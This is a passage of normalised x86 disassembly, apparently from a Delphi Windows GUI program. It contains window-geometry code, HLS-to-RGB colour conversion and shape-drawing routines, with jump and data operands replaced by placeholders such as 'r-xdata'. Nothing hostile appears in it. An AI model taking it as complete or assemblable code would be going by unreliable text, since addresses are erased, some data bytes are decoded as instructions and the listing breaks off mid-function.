mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_46dca8
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_46aaa8
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44c214
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44c3b8
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_46b6f4
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_449914
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_4040d0
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_44da78
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_46ddfc
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_4034a4
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44c38c
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44c38c
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_44ca14
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_46b840
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_46de5c
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_46da78
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_46da78
jmp r-xdata
sub_46e29c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_40408c
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_40408c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46e2d8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_44da78
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_44da78
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_459630
sub_46e368
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_46e390
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_46e434
add [ eax ] eax
add [ eax ] al
les edi [ esi ]
dec ecx
add al cl
lea eax [ eax + eax ]
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46e497
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e49e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_463e0c
mov eax sub_46408c
call sub_41827c
mov eax [ rw-data ]
push eax
call CloseHandle
sub_46e4e4
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
call sub_406064
cmp ebx [ eax + 0x10 ]
jne r-xdata
mov eax ebx
call sub_406d18
mov esi eax
and esi 0xff
mov eax ebx
call sub_406d1c
mov edi eax
and edi 0xff
mov eax ebx
call sub_406d20
and eax 0xff
mov [ ebp - 0x22 ] ax
movzx edx di
movzx eax si
call sub_42be9c
movzx edx [ ebp - 0x22 ]
call sub_42be9c
mov [ ebp - 0x6c ] eax
fild [ ebp - 0x6c ]
fstp [ ebp - 0x30 ]
fwait
movzx edx di
movzx eax si
call sub_42be94
movzx edx [ ebp - 0x22 ]
call sub_42be94
mov [ ebp - 0x6c ] eax
fild [ ebp - 0x6c ]
fstp [ ebp - 0x38 ]
fwait
fld [ ebp - 0x30 ]
fadd [ ebp - 0x38 ]
fmul [ r-xdata ]
fadd [ r-xdata ]
fdiv [ r-xdata ]
fstp [ ebp - 0x18 ]
fwait
fld [ ebp - 0x30 ]
fcomp [ ebp - 0x38 ]
fnstsw ax
sahf
jne r-xdata
call sub_406064
mov ax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] ax
call sub_406064
mov ax [ eax + 0x16 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] ax
call sub_406064
mov ax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] ax
jmp r-xdata
fld [ ebp - 0x18 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
ja r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xa0
fld [ ebp - 0x18 ]
call sub_402a78
mov edx [ ebp - 0x8 ]
mov [ edx ] ax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
fld [ ebp - 0x30 ]
fsub [ ebp - 0x38 ]
fmul [ r-xdata ]
fld [ r-xdata ]
fsub [ ebp - 0x30 ]
fsub [ ebp - 0x38 ]
fdiv [ r-xdata ]
faddp st1
fld [ r-xdata ]
fsub [ ebp - 0x30 ]
fsub [ ebp - 0x38 ]
fdivp st1
fstp [ ebp - 0x20 ]
fwait
fld [ ebp - 0x30 ]
fsub [ ebp - 0x38 ]
fmul [ r-xdata ]
fld [ ebp - 0x30 ]
fadd [ ebp - 0x38 ]
fdiv [ r-xdata ]
faddp st1
fld [ ebp - 0x30 ]
fadd [ ebp - 0x38 ]
fdivp st1
fstp [ ebp - 0x20 ]
fwait
jmp r-xdata
call sub_406064
mov [ eax + 0x10 ] ebx
call sub_406064
mov edx [ ebp - 0x4 ]
mov dx [ edx ]
mov [ eax + 0x14 ] dx
call sub_406064
mov edx [ ebp - 0x8 ]
mov dx [ edx ]
mov [ eax + 0x16 ] dx
call sub_406064
mov edx [ ebp + 0x8 ]
mov dx [ edx ]
mov [ eax + 0x18 ] dx
movzx eax di
mov [ ebp - 0x6c ] eax
fild [ ebp - 0x6c ]
fcomp [ ebp - 0x30 ]
fnstsw ax
sahf
jne r-xdata
fld [ ebp - 0x68 ]
fld [ ebp - 0x58 ]
fsubp st1
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
movzx eax si
mov [ ebp - 0x6c ] eax
fild [ ebp - 0x6c ]
fsubr [ ebp - 0x30 ]
fmul [ r-xdata ]
fld [ ebp - 0x30 ]
fsub [ ebp - 0x38 ]
fdiv [ r-xdata ]
faddp st1
fld [ ebp - 0x30 ]
fsub [ ebp - 0x38 ]
fdivp st1
fstp [ ebp - 0x48 ]
fwait
movzx eax di
mov [ ebp - 0x6c ] eax
fild [ ebp - 0x6c ]
fsubr [ ebp - 0x30 ]
fmul [ r-xdata ]
fld [ ebp - 0x30 ]
fsub [ ebp - 0x38 ]
fdiv [ r-xdata ]
faddp st1
fld [ ebp - 0x30 ]
fsub [ ebp - 0x38 ]
fdivp st1
fstp [ ebp - 0x58 ]
fwait
movzx eax [ ebp - 0x22 ]
mov [ ebp - 0x6c ] eax
fild [ ebp - 0x6c ]
fsubr [ ebp - 0x30 ]
fmul [ r-xdata ]
fld [ ebp - 0x30 ]
fsub [ ebp - 0x38 ]
fdiv [ r-xdata ]
faddp st1
fld [ ebp - 0x30 ]
fsub [ ebp - 0x38 ]
fdivp st1
fstp [ ebp - 0x68 ]
fwait
movzx eax si
mov [ ebp - 0x6c ] eax
fild [ ebp - 0x6c ]
fcomp [ ebp - 0x30 ]
fnstsw ax
sahf
jne r-xdata
fld [ ebp - 0x58 ]
fadd [ r-xdata ]
fld [ ebp - 0x48 ]
fsubp st1
fstp [ ebp - 0x10 ]
fwait
fld [ ebp - 0x48 ]
fadd [ r-xdata ]
fld [ ebp - 0x68 ]
fsubp st1
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jbe r-xdata
fld [ ebp - 0x10 ]
fadd [ r-xdata ]
fstp [ ebp - 0x10 ]
fwait
fld [ ebp - 0x10 ]
call sub_402a78
mov edx [ ebp - 0x4 ]
mov [ edx ] ax
fld [ ebp - 0x18 ]
call sub_402a78
mov edx [ ebp - 0x8 ]
mov [ edx ] ax
fld [ ebp - 0x20 ]
call sub_402a78
mov edx [ ebp + 0x8 ]
mov [ edx ] ax
fld [ ebp - 0x10 ]
fsub [ r-xdata ]
fstp [ ebp - 0x10 ]
fwait
sub_46e804
push ebp
mov ebp esp
add esp 0xfffffff8
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jbe r-xdata
fld [ ebp + 0x8 ]
fadd [ r-xdata ]
fstp [ ebp + 0x8 ]
fwait
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x8 ]
fsub [ r-xdata ]
fstp [ ebp + 0x8 ]
fwait
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fsub [ ebp + 0x18 ]
fmul [ ebp + 0x8 ]
fadd [ r-xdata ]
fdiv [ r-xdata ]
fadd [ ebp + 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
fld [ ebp - 0x8 ]
call sub_402a78
pop ecx
pop ecx
pop ebp
retn 0x18
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x4 ] eax
fld [ ebp + 0x10 ]
fsub [ ebp + 0x18 ]
fld [ r-xdata ]
fsub [ ebp + 0x8 ]
fmulp st1
fadd [ r-xdata ]
fdiv [ r-xdata ]
fadd [ ebp + 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_46e8f0
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jbe r-xdata
fld [ ebp + 0x8 ]
call sub_402a78
mov eax 0xff
jmp r-xdata
pop ebp
retn 0x8
sub_46e918
push ebx
push esi
push edi
add esp 0xffffffd0
mov esi eax
test cx cx
jne r-xdata
movzx eax dx
mov [ esp + 0x28 ] eax
fild [ esp + 0x28 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
ja r-xdata
movzx eax dx
mov edx eax
shl eax 0x8
sub eax edx
mov [ esp + 0x28 ] eax
fild [ esp + 0x28 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
mov eax [ esp ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0x14 ] eax
movzx eax si
mov [ esp + 0x28 ] eax
fild [ esp + 0x28 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jmp r-xdata
movzx eax dx
mov edi eax
movzx ebx cx
add edi ebx
mov [ esp + 0x28 ] edi
fild [ esp + 0x28 ]
imul eax ebx
mov [ esp + 0x2c ] eax
fild [ esp + 0x2c ]
fadd [ r-xdata ]
fdiv [ r-xdata ]
fsubp st1
fstp [ esp + 0x20 ]
fwait
movzx eax dx
movzx ecx cx
add ecx 0xf0
imul eax ecx
mov [ esp + 0x28 ] eax
fild [ esp + 0x28 ]
fadd [ r-xdata ]
fdiv [ r-xdata ]
fstp [ esp + 0x20 ]
fwait
jmp r-xdata
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_46e8f0
push eax
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_46e8f0
push eax
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_46e8f0
pop edx
pop ecx
call sub_406cfc
add esp 0x30
pop edi
pop esi
pop ebx
retn
movzx eax dx
add eax eax
mov [ esp + 0x28 ] eax
fild [ esp + 0x28 ]
fsub [ esp + 0x20 ]
fstp [ esp + 0x18 ]
fwait
push [ esp + 0x1c ]
push [ esp + 0x1c ]
push [ esp + 0x2c ]
push [ esp + 0x2c ]
movzx eax si
mov [ esp + 0x38 ] eax
fild [ esp + 0x38 ]
fadd [ r-xdata ]
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_46e804
mov edx eax
shl eax 0x8
sub eax edx
mov [ esp + 0x28 ] eax
fild [ esp + 0x28 ]
fadd [ r-xdata ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
push [ esp + 0x1c ]
push [ esp + 0x1c ]
push [ esp + 0x2c ]
push [ esp + 0x2c ]
movzx eax si
mov [ esp + 0x38 ] eax
fild [ esp + 0x38 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_46e804
mov edx eax
shl eax 0x8
sub eax edx
mov [ esp + 0x28 ] eax
fild [ esp + 0x28 ]
fadd [ r-xdata ]
fdiv [ r-xdata ]
fstp [ esp + 0x8 ]
fwait
push [ esp + 0x1c ]
push [ esp + 0x1c ]
push [ esp + 0x2c ]
push [ esp + 0x2c ]
movzx eax si
mov [ esp + 0x38 ] eax
fild [ esp + 0x38 ]
fsub [ r-xdata ]
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_46e804
mov edx eax
shl eax 0x8
sub eax edx
mov [ esp + 0x28 ] eax
fild [ esp + 0x28 ]
fadd [ r-xdata ]
fdiv [ r-xdata ]
fstp [ esp + 0x10 ]
fwait
sub_46eb28
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
call sub_406064
cmp ebx [ eax + 0x34 ]
jne r-xdata
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_423fe4
lea ecx [ esp + 0x6 ]
lea edx [ esp + 0x4 ]
call sub_46e4e4
mov dx [ esp + 0x2 ]
add dx si
mov cx [ esp + 0x4 ]
mov ax [ esp ]
call sub_46e918
mov edi eax
call sub_406064
mov [ eax + 0x34 ] ebx
call sub_406064
mov [ eax + 0x38 ] esi
call sub_406064
mov [ eax + 0x3c ] edi
call sub_406064
cmp esi [ eax + 0x38 ]
jne r-xdata
call sub_406064
mov edi [ eax + 0x3c ]
jmp r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_46ebb4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
call sub_406064
cmp esi [ eax + 0x20 ]
jne r-xdata
cmp esi 0xff00000f
jne r-xdata
call sub_406064
cmp ebx [ eax + 0x1c ]
jne r-xdata
mov eax esi
call sub_423fe4
mov edi eax
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x6 ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_46e4e4
cmp [ esp + 0x4 ] 0xdc
jbe r-xdata
cmp ebx 0x13
jne r-xdata
call sub_406064
mov edi [ eax + 0x24 ]
jmp r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
call sub_46eb28
mov edi eax
mov dx [ esp + 0x2 ]
sub dx bx
mov cx [ esp + 0x4 ]
mov ax [ esp ]
call sub_46e918
mov edi eax
jmp r-xdata
mov edi 0xff000014
jmp r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
call sub_406064
mov [ eax + 0x1c ] ebx
call sub_406064
mov [ eax + 0x20 ] esi
call sub_406064
mov [ eax + 0x24 ] edi
sub_46ec74
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
call sub_406064
cmp esi [ eax + 0x2c ]
jne r-xdata
cmp esi 0xff00000f
jne r-xdata
call sub_406064
cmp ebx [ eax + 0x28 ]
jne r-xdata
mov eax esi
call sub_423fe4
mov edi eax
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x6 ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_46e4e4
cmp [ esp + 0x4 ] 0xa0
jb r-xdata
cmp ebx 0xffffffce
jne r-xdata
call sub_406064
mov edi [ eax + 0x30 ]
jmp r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
call sub_46eb28
mov edi eax
mov dx [ esp + 0x2 ]
add dx bx
mov cx [ esp + 0x4 ]
mov ax [ esp ]
call sub_46e918
mov edi eax
jmp r-xdata
mov edi 0xff000010
jmp r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
call sub_406064
mov [ eax + 0x28 ] ebx
call sub_406064
mov [ eax + 0x2c ] esi
call sub_406064
mov [ eax + 0x30 ] edi
sub_46ed34
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi + 0x14 ]
call sub_424c68
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x10 ]
call sub_424988
mov edx eax
mov eax [ edi + 0x14 ]
call sub_424c70
lea edx [ ebp - 0x24 ]
xor eax eax
mov al bl
lea eax [ eax + eax * 2 ]
lea eax [ eax * 8 + rw-data ]
mov ecx 0x18
call sub_4028c8
mov esi 0x3
lea ebx [ ebp - 0x24 ]
lea ecx [ ebp - 0x2c ]
mov edx [ ebx + 0x4 ]
imul edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
mov eax [ ebx ]
imul eax [ ebp + 0x8 ]
add eax [ ebp - 0x8 ]
call sub_41725c
mov eax [ ebp - 0x2c ]
mov [ ebx ] eax
mov eax [ ebp - 0x28 ]
mov [ ebx + 0x4 ] eax
add ebx 0x8
dec esi
jne r-xdata
mov eax [ edi + 0x10 ]
call sub_424a94
mov ebx eax
mov eax [ edi + 0x10 ]
mov edx 0x1
call sub_424a9c
lea edx [ ebp - 0x24 ]
mov ecx 0x2
mov eax edi
call sub_4251a8
mov eax [ edi + 0x10 ]
mov edx ebx
call sub_424a9c
mov eax [ edi + 0x14 ]
mov edx [ ebp - 0xc ]
call sub_424c70
sub_46ee00
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0x8
lea edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x1 ]
lea eax [ eax + eax * 2 ]
lea eax [ eax * 8 + rw-data ]
mov ecx 0x18
call sub_4028c8
mov esi 0x3
lea ebx [ ebp - 0x18 ]
mov edx [ edi ]
imul edx [ ebx + 0x4 ]
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x5 ]
mov eax [ edi ]
imul eax [ ebx ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx - 0x9 ]
lea ecx [ ebp - 0x20 ]
call sub_41725c
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x1c ]
mov [ ebx + 0x4 ] eax
add ebx 0x8
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x1 ]
sub al 0x1
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
inc edx
mov eax [ ebp - 0x8 ]
inc eax
call sub_41725c
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x4 ] eax
je r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
inc edx
mov eax [ ebp - 0x8 ]
dec eax
call sub_41725c
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov ecx 0x2
call sub_4251e0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
dec al
jne r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
dec edx
mov eax [ ebp - 0x8 ]
inc eax
call sub_41725c
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_46eeec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x1 ] dl
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x10 ]
call sub_424a94
mov ebx eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_424a9c
mov al [ ebp - 0x1 ]
sub al 0x2
jb r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x9 ] eax
push ebp
call sub_46ee00
pop ecx
inc [ ebp - 0x9 ]
push ebp
call sub_46ee00
pop ecx
add [ ebp - 0x9 ] 0x3
push ebp
call sub_46ee00
pop ecx
inc [ ebp - 0x9 ]
push ebp
call sub_46ee00
pop ecx
jmp r-xdata
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_424a9c
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x5 ] eax
push ebp
call sub_46ee00
pop ecx
inc [ ebp - 0x5 ]
push ebp
call sub_46ee00
pop ecx
add [ ebp - 0x5 ] 0x3
push ebp
call sub_46ee00
pop ecx
inc [ ebp - 0x5 ]
push ebp
call sub_46ee00
pop ecx
jmp r-xdata
sub_46efa8
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_424dc0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_46f1f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x10 ]
mov edx 0x1
call sub_424a9c
lea ecx [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41725c
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x38 ] eax
lea ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx ebx
mov eax [ ebp - 0x8 ]
add eax ebx
call sub_41725c
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x30 ] eax
lea ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x4 ]
sub edx ebx
mov edi ebx
add edi edi
mov eax edi
add eax [ ebp - 0x8 ]
add eax ebx
call sub_41725c
mov eax [ ebp - 0x54 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x28 ] eax
lea ecx [ ebp - 0x5c ]
mov edx [ ebp - 0x4 ]
sub edx ebx
dec edx
mov eax edi
add eax [ ebp - 0x8 ]
add eax ebx
call sub_41725c
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x64 ]
mov edx [ ebp - 0x4 ]
add edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax ebx
call sub_41725c
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x18 ] eax
lea ecx [ ebp - 0x6c ]
mov edx [ ebp - 0x4 ]
sub edx 0x2
mov eax [ ebp - 0x8 ]
dec eax
